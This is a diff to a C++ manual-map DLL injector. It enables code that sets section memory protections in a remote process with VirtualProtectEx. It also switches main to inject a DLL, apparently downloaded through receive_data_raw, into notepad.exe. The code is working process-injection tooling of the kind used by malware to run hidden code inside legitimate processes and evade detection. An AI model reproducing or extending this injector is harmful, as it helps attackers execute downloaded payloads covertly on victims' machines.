@@ -321,6 +321,30 @@ bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
     
 //======================================================================================================================================================================
 
+    //Set memory protection for sections
+
+    std::cout << "\n\n-> Setting memory protection for sections" << std::endl << "No. of sections : " << ntHeaders->FileHeader.NumberOfSections << std::endl;
+
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
+    {
+        DWORD oldProtect;
+        void* sectionAddr = (BYTE*)remoteMem + sectionHeader[i].VirtualAddress;
+        DWORD newProtect = PAGE_READONLY;
+
+        if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
+            newProtect = PAGE_EXECUTE_READWRITE;
+        else if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+            newProtect = PAGE_EXECUTE_READ;
+        else if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
+            newProtect = PAGE_READWRITE;
+
+        VirtualProtectEx(hProcess, sectionAddr, sectionHeader[i].Misc.VirtualSize, newProtect, &oldProtect);
+        std::cout << "-> memory permission set for section: " << sectionHeader[i].Name << "\t[" << std::hex << oldProtect << "] -> [" << newProtect << "]" << std::dec << std::endl;
+    }
+
+//======================================================================================================================================================================
+
+
 // TlsCallbacks
 
     // if(tlsDir.Size == 0) 
@@ -378,30 +402,7 @@ bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
     // }
 //======================================================================================================================================================================
 
-    // Set memory protection for sections
-
-    // std::cout << "\n\n-> Setting memory protection for sections" << std::endl << "No. of sections : " << ntHeaders->FileHeader.NumberOfSections << std::endl;
-
-    // for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
-    // {
-    //     DWORD oldProtect;
-    //     void* sectionAddr = (BYTE*)remoteMem + sectionHeader[i].VirtualAddress;
-    //     DWORD newProtect = PAGE_READONLY;
-
-    //     if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
-    //         newProtect = PAGE_EXECUTE_READWRITE;
-    //     else if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
-    //         newProtect = PAGE_EXECUTE_READ;
-    //     else if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
-    //         newProtect = PAGE_READWRITE;
-
-    //     VirtualProtectEx(hProcess, sectionAddr, sectionHeader[i].Misc.VirtualSize, newProtect, &oldProtect);
-    //     std::cout << "-> memory permission set for section: " << sectionHeader[i].Name << "\t[" << oldProtect << "] -> [" << newProtect << "]" << std::endl;
-    // }
-
-//======================================================================================================================================================================
-
-    // // Call the entry point
+    // Call the entry point
     // void* entryPoint = (BYTE*)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint;
     // HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)entryPoint, remoteMem, 0, nullptr);
     // if (!hThread)
@@ -420,8 +421,8 @@ int main()
 {
     load_dll();
  
-    //std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
-    std::vector <unsigned char> downloaded_dll = receive_data_raw("AudioEndpointBuilder.dll");
+    std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
+    //std::vector <unsigned char> downloaded_dll = receive_data_raw("AudioEndpointBuilder.dll");
 
     std::cout << "Trying to get a handle to the process...\n"; 
     DWORD processID = GetProcessID(L"notepad.exe");
